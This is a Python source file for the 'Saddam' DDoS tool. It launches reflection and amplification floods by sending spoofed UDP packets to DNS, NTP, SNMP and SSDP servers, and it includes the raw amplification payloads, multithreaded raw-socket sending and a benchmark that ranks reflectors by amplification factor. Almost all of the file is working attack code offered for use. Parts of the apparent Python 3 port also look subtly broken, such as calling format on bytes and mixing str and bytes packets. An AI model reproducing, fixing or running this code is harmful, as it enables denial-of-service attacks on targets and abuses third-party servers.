#!/usr/bin/env python
import sys
import time
import socket
import struct
import threading
from random import randint
from optparse import OptionParser

# Fixed import - assuming these are custom classes in your project
try:
    from pinject import IP, UDP
except ImportError:
    print("Error: pinject module not found. Please ensure IP and UDP classes are available.")
    sys.exit(1)

USAGE = '''
%prog target.com [options]        # DDoS
%prog benchmark [options]         # Calculate AMPLIFICATION factor
'''

LOGO = r'''
	   _____           __    __              
	  / ___/____ _____/ /___/ /___ _____ ___ 
	  \__ \/ __ `/ __  / __  / __ `/ __ `__ \\
	 ___/ / /_/ / /_/ / /_/ / /_/ / / / / / /
	/____/\__,_/\__,_/\__,_/\__,_/_/ /_/ /_/ 
	https://github.com/OffensivePython/Saddam
	   https://twitter.com/OffensivePython
'''

HELP = (
	'DNS Amplification File and Domains to Resolve (e.g: dns.txt:[evildomain.com|domains_file.txt]',
	'NTP Amplification file',
	'SNMP Amplification file',
	'SSDP Amplification file',
	'Number of threads (default=1)' )

OPTIONS = (
	(('-d', '--dns'), dict(dest='dns', metavar='FILE:FILE|DOMAIN', help=HELP[0])),
	(('-n', '--ntp'), dict(dest='ntp', metavar='FILE', help=HELP[1])),
	(('-s', '--snmp'), dict(dest='snmp', metavar='FILE', help=HELP[2])),
	(('-p', '--ssdp'), dict(dest='ssdp', metavar='FILE', help=HELP[3])),
	(('-t', '--threads'), dict(dest='threads', type=int, default=1, metavar='N', help=HELP[4])) )

BENCHMARK = (
	'Protocol'
	'|  IP  Address  '
	'|     Amplification     '
	'|     Domain    '
	'\n{}').format('-'*75)

ATTACK = (
	'     Sent      '
	'|    Traffic    '
	'|    Packet/s   '
	'|     Bit/s     '
	'\n{}').format('-'*63)

PORT = {
	'dns': 53,
	'ntp': 123,
	'snmp': 161,
	'ssdp': 1900 }

PAYLOAD = {
	'dns': ('{}\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01'
			'{}\x00\x00\xff\x00\xff\x00\x00\x29\x10\x00'
			'\x00\x00\x00\x00\x00\x00'),
	'snmp':('\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c'
		'\x69\x63\xa5\x19\x02\x04\x71\xb4\xb5\x68\x02\x01'
		'\x00\x02\x01\x7F\x30\x0b\x30\x09\x06\x05\x2b\x06'
		'\x01\x02\x01\x05\x00'),
	'ntp':('\x17\x00\x02\x2a'+'\x00'*4),
	'ssdp':('M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n'
		'MAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n')
}

amplification = {
	'dns': {},
	'ntp': {},
	'snmp': {},
	'ssdp': {} }		# Amplification factor

FILE_NAME = 0			# Index of files names
FILE_HANDLE = 1 		# Index of files descriptors

npackets = 0			# Number of packets sent
nbytes = 0				# Number of bytes reflected
files = {}				# Amplifications files

SUFFIX = {
	0: '',
	1: 'K',
	2: 'M',
	3: 'G',
	4: 'T'}

# Thread-safe counters
npackets_lock = threading.Lock()
nbytes_lock = threading.Lock()

def Calc(n, d, unit=''):
    if n == 0:
        return '0' + unit
    i = 0
    r = float(n)
    while r/d>=1 and i < len(SUFFIX)-1:
        r = r/d
        i += 1
    return '{:.2f}{}{}'.format(r, SUFFIX[i], unit)

def GetDomainList(domains):
    domain_list = []

    if domains.upper().endswith('.TXT'):
        try:
            with open(domains, 'r') as file:
                content = file.read()
                content = content.replace('\r', '')
                content = content.replace(' ', '')
                content = content.split('\n')
                for domain in content:
                    if domain and domain.strip():
                        domain_list.append(domain.strip())
        except IOError as e:
            print(f"Error reading domain file {domains}: {e}")
            sys.exit(1)
    else:
        domain_list = [d.strip() for d in domains.split(',') if d.strip()]
    
    return domain_list

def Monitor():
    '''
        Monitor attack
    '''
    print(ATTACK)
    FMT = '{:^15}|{:^15}|{:^15}|{:^15}'
    start = time.time()
    try:
        while True:
            current = time.time() - start
            if current > 0:
                with npackets_lock:
                    current_packets = npackets
                with nbytes_lock:
                    current_bytes = nbytes
                
                bps = (current_bytes * 8) / current
                pps = current_packets / current
                out = FMT.format(Calc(current_packets, 1000), 
                    Calc(current_bytes, 1024, 'B'), Calc(pps, 1000, 'pps'), Calc(bps, 1000, 'bps'))
                sys.stderr.write('\r{}{}'.format(out, ' '*(60-len(out))))
                sys.stderr.flush()
            time.sleep(1)
    except KeyboardInterrupt:
        print('\nInterrupted')
    except Exception as err:
        print('\nError:', str(err))

def AmpFactor(recvd, sent):
    if sent == 0:
        return 'N/A (division by zero)'
    return '{}x ({}B -> {}B)'.format(recvd//sent, sent, recvd)

def Benchmark(ddos):
    print(BENCHMARK)
    i = 0
    for proto in files:
        try:
            with open(files[proto][FILE_NAME], 'r') as f:
                for soldier in f:
                    soldier = soldier.strip()
                    if soldier:
                        if proto == 'dns':
                            for domain in ddos.domains:
                                i += 1
                                recvd, sent = ddos.GetAmpSize(proto, soldier, domain)
                                if sent > 0 and recvd > 0:
                                    print('{:^8}|{:^15}|{:^23}|{}'.format(proto, soldier, 
                                        AmpFactor(recvd, sent), domain))
                        else:
                            recvd, sent = ddos.GetAmpSize(proto, soldier)
                            if sent > 0 and recvd > 0:
                                print('{:^8}|{:^15}|{:^23}|{}'.format(proto, soldier, 
                                    AmpFactor(recvd, sent), 'N/A'))
                                i += 1
        except IOError as e:
            print(f"Error reading file {files[proto][FILE_NAME]}: {e}")
            continue
    print('Total tested:', i)

class DDoS(object):
    def __init__(self, target, threads, domains, event):
        self.target = target
        self.threads = threads
        self.event = event
        self.domains = domains if domains else []
        
    def stress(self):
        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=self.__attack)
            t.daemon = True
            threads.append(t)
            t.start()
        
        # Wait for all threads to complete
        for t in threads:
            t.join()
            
    def __send(self, sock, soldier, proto, payload):
        '''
            Send a Spoofed Packet
        '''
        try:
            udp = UDP(randint(1, 65535), PORT[proto], payload).pack(self.target, soldier)
            ip = IP(self.target, soldier, udp, proto=socket.IPPROTO_UDP).pack()
            sock.sendto(ip + udp + payload, (soldier, PORT[proto]))
            return True
        except Exception as e:
            print(f"Error sending packet to {soldier}: {e}")
            return False
            
    def GetAmpSize(self, proto, soldier, domain=''):
        '''
            Get Amplification Size
        '''
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(2)
        data = b''
        
        try:
            if proto in ['ntp', 'ssdp']:
                packet = PAYLOAD[proto].encode() if isinstance(PAYLOAD[proto], str) else PAYLOAD[proto]
                sock.sendto(packet, (soldier, PORT[proto]))
                try:
                    while True:
                        chunk, _ = sock.recvfrom(65535)
                        data += chunk
                except socket.timeout:
                    pass
            else:
                if proto == 'dns':
                    packet = self.__GetDnsQuery(domain)
                else:
                    packet = PAYLOAD[proto]
                    
                # Ensure packet is bytes
                if isinstance(packet, str):
                    packet = packet.encode()
                    
                sock.sendto(packet, (soldier, PORT[proto]))
                data, _ = sock.recvfrom(65535)
        except socket.timeout:
            data = b''
        except Exception as e:
            print(f"Error testing {soldier} for {proto}: {e}")
            data = b''
        finally:
            sock.close()
            
        return len(data), len(packet)
        
    def __GetQName(self, domain):
        '''
            QNAME A domain name represented as a sequence of labels 
            where each label consists of a length
            octet followed by that number of octets
        '''
        labels = domain.split('.')
        QName = b''
        for label in labels:
            if label:
                QName += struct.pack('B', len(label)) + label.encode()
        return QName
        
    def __GetDnsQuery(self, domain):
        id = struct.pack('H', randint(0, 65535))
        QName = self.__GetQName(domain)
        base_payload = PAYLOAD['dns']
        # Ensure proper formatting for bytes
        if isinstance(base_payload, str):
            base_payload = base_payload.encode('latin-1')
        if isinstance(id, str):
            id = id.encode('latin-1')
        if isinstance(QName, str):
            QName = QName.encode('latin-1')
            
        return base_payload.format(id, QName)
        
    def __attack(self):
        global npackets, nbytes
        
        _files = {}
        for proto in files:
            try:
                f = open(files[proto][FILE_NAME], 'r')
                _files[proto] = [files[proto][FILE_NAME], f]
            except IOError as e:
                print(f"Error opening file {files[proto][FILE_NAME]}: {e}")
                continue
                
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        except socket.error as e:
            print(f"Raw socket creation failed: {e}")
            print("This script requires root/administrator privileges")
            return
            
        try:
            while self.event.is_set():
                for proto in _files:
                    soldier = _files[proto][FILE_HANDLE].readline().strip()
                    if not soldier:
                        _files[proto][FILE_HANDLE].seek(0)
                        continue
                        
                    if proto == 'dns':
                        if soldier not in amplification[proto]:
                            amplification[proto][soldier] = {}
                        for domain in self.domains:
                            if domain not in amplification[proto][soldier]:
                                size, _ = self.GetAmpSize(proto, soldier, domain)
                                if size == 0:
                                    break
                                elif size < len(PAYLOAD[proto]):
                                    continue
                                else:
                                    amplification[proto][soldier][domain] = size
                                    
                            amp = self.__GetDnsQuery(domain)
                            if self.__send(sock, soldier, proto, amp):
                                with npackets_lock:
                                    npackets += 1
                                with nbytes_lock:
                                    nbytes += amplification[proto][soldier][domain]
                    else:
                        if soldier not in amplification[proto]:
                            size, _ = self.GetAmpSize(proto, soldier)
                            if size < len(PAYLOAD[proto]):
                                continue
                            else:
                                amplification[proto][soldier] = size
                                
                        amp = PAYLOAD[proto]
                        if self.__send(sock, soldier, proto, amp):
                            with npackets_lock:
                                npackets += 1
                            with nbytes_lock:
                                nbytes += amplification[proto][soldier]
        finally:
            sock.close()
            for proto in _files:
                _files[proto][FILE_HANDLE].close()

def main():
    print(LOGO)
    
    parser = OptionParser(usage=USAGE)
    for args, kwargs in OPTIONS:
        parser.add_option(*args, **kwargs)
    options, args = parser.parse_args()
    
    domains = None
    if len(args) < 1:
        parser.print_help()
        sys.exit(1)
        
    if options.dns:
        if ':' not in options.dns:
            print('DNS option requires format: file:domain or file:domain_file.txt')
            sys.exit(1)
        dns_file, domains_str = options.dns.split(':', 1)
        domains = GetDomainList(domains_str)
        if domains:
            files['dns'] = [dns_file]
        else:
            print('Specify valid domains to resolve (e.g: --dns=dns.txt:evildomain.com)')
            sys.exit(1)
            
    if options.ntp:
        files['ntp'] = [options.ntp]
    if options.snmp:
        files['snmp'] = [options.snmp]
    if options.ssdp:
        files['ssdp'] = [options.ssdp]
        
    if not files:
        parser.print_help()
        sys.exit(1)
        
    event = threading.Event()
    event.set()
    
    if args[0].upper() == 'BENCHMARK':
        ddos = DDoS(args[0], options.threads, domains, event)
        Benchmark(ddos)
    else:
        try:
            target_ip = socket.gethostbyname(args[0])
        except socket.gaierror:
            print(f"Error: Cannot resolve target {args[0]}")
            sys.exit(1)
            
        ddos = DDoS(target_ip, options.threads, domains, event)
        
        # Start attack in a separate thread
        attack_thread = threading.Thread(target=ddos.stress)
        attack_thread.daemon = True
        attack_thread.start()
        
        try:
            Monitor()
        finally:
            event.clear()
            attack_thread.join(timeout=5)

if __name__ == '__main__':
    main()
